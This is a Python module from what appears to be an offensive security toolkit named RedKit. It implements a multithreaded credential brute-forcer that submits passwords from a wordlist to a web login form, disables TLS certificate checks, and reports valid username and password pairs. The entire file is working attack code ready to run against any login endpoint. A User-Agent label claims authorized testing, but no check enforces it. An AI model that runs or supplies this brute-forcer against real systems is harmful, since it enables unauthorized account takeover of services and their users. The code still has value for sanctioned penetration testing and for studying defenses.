"""
modules/auth/login_bruteforce.py — Credential brute-force against a login form.

POSTs each password from a wordlist (paired with the configured username)
to the target login URL and determines success by checking for the absence
of a configurable failure string in the response. Stops on first success.
Includes per-thread rate-limiting to help avoid account lockouts.
"""

import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed, Future
from pathlib import Path
from threading import Event
from typing import Optional

import requests
from requests.exceptions import RequestException
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from modules.base_module import BaseModule

logger = logging.getLogger(__name__)

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
_DEFAULT_WORDLIST = _PROJECT_ROOT / "wordlists" / "passwords.txt"

_RATE_LIMIT_DELAY: float = 0.5  # seconds between requests per thread


class LoginBruteforce(BaseModule):
    """Brute-force a web login form by POSTing credentials from a wordlist.

    Stops immediately on first successful authentication. Reports the
    discovered credentials as a CRITICAL severity finding.
    """

    name = "Login Brute-Forcer"
    description = "Brute-forces a login form by POSTing passwords from a wordlist."
    author = "K4os"
    category = "auth"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Full URL of the login form POST endpoint.",
        },
        "username_field": {
            "value": None,
            "required": True,
            "description": "Name attribute of the username HTML field.",
        },
        "password_field": {
            "value": None,
            "required": True,
            "description": "Name attribute of the password HTML field.",
        },
        "username": {
            "value": None,
            "required": True,
            "description": "Username to use for all attempts.",
        },
        "wordlist": {
            "value": str(_DEFAULT_WORDLIST),
            "required": False,
            "description": "Path to the password wordlist file.",
        },
        "failure_string": {
            "value": None,
            "required": True,
            "description": "String present in the response body on failed login (e.g. 'Invalid password').",
        },
        "threads": {
            "value": "5",
            "required": False,
            "description": "Number of concurrent threads (default: 5).",
        },
        "timeout": {
            "value": "5",
            "required": False,
            "description": "HTTP request timeout in seconds (default: 5).",
        },
    }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _load_wordlist(self, path: str) -> list[str]:
        """Load passwords from the wordlist file.

        Args:
            path: Path to the password wordlist.

        Returns:
            List of password strings.
        """
        wl_path = Path(path)
        if not wl_path.is_file():
            logger.warning("Password wordlist not found: %s", path)
            return []
        with open(wl_path, "r", encoding="utf-8", errors="ignore") as fh:
            return [line.strip() for line in fh if line.strip()]

    def _try_password(
        self,
        target: str,
        username_field: str,
        password_field: str,
        username: str,
        password: str,
        failure_string: str,
        timeout: int,
        headers: dict,
        stop_event: Event,
    ) -> Optional[str]:
        """Attempt a single login with the given password.

        Args:
            target: Login form POST URL.
            username_field: Name of the username field.
            password_field: Name of the password field.
            username: Username to use.
            password: Password candidate.
            failure_string: String indicating login failure.
            timeout: HTTP timeout.
            headers: HTTP headers dict.
            stop_event: Threading event set when a success is found.

        Returns:
            The successful password string if login succeeded, else None.
        """
        if stop_event.is_set():
            return None

        time.sleep(_RATE_LIMIT_DELAY)

        data = {username_field: username, password_field: password}
        try:
            resp = requests.post(
                target,
                data=data,
                timeout=timeout,
                headers=headers,
                verify=False,
                allow_redirects=True,
            )
            if failure_string not in resp.text:
                return password
        except RequestException as exc:
            logger.debug("Request error with password '%s': %s", password, exc)

        return None

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Execute the brute-force attack, stopping on first success."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        username_field = self.get_option("username_field")
        password_field = self.get_option("password_field")
        username = self.get_option("username")
        wordlist_path = self.get_option("wordlist")
        failure_string = self.get_option("failure_string")
        threads = int(self.get_option("threads") or 5)
        timeout = int(self.get_option("timeout") or 5)

        passwords = self._load_wordlist(wordlist_path)
        if not passwords:
            logger.error("Empty password list — aborting.")
            return

        config_path = _PROJECT_ROOT / "config.yaml"
        user_agent = "RedKit/1.0 (Authorized Security Testing)"
        try:
            import yaml
            with open(config_path) as f:
                cfg = yaml.safe_load(f)
                user_agent = cfg.get("default_user_agent", user_agent)
        except Exception:
            pass

        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        headers = {"User-Agent": user_agent}
        stop_event = Event()

        logger.info(
            "Login brute-force: target=%s, user=%s, passwords=%d, threads=%d",
            target, username, len(passwords), threads,
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(
                f"Brute-forcing {target} as '{username}'", total=len(passwords)
            )

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures: dict[Future, str] = {
                    executor.submit(
                        self._try_password,
                        target, username_field, password_field, username,
                        pw, failure_string, timeout, headers, stop_event,
                    ): pw
                    for pw in passwords
                }

                for future in as_completed(futures):
                    if stop_event.is_set():
                        future.cancel()
                        continue
                    pw = futures[future]
                    progress.advance(task)
                    try:
                        result = future.result()
                        if result:
                            stop_event.set()
                            logger.warning("Login success: %s / %s", username, result)
                            self._add_finding(
                                finding_type="Authentication",
                                severity="CRITICAL",
                                title=f"Valid credentials found: {username}:{result}",
                                detail=(
                                    f"The login form at {target} accepted the credentials "
                                    f"'{username}:{result}'. The failure string '{failure_string}' "
                                    f"was absent from the response, indicating successful authentication."
                                ),
                                evidence=f"POST {target}\n{username_field}={username}&{password_field}={result}",
                            )
                    except Exception as exc:  # noqa: BLE001
                        logger.debug("Future error for password '%s': %s", pw, exc)

        total = len(self.get_findings())
        logger.info("Login brute-force complete: %d valid credential(s) found.", total)
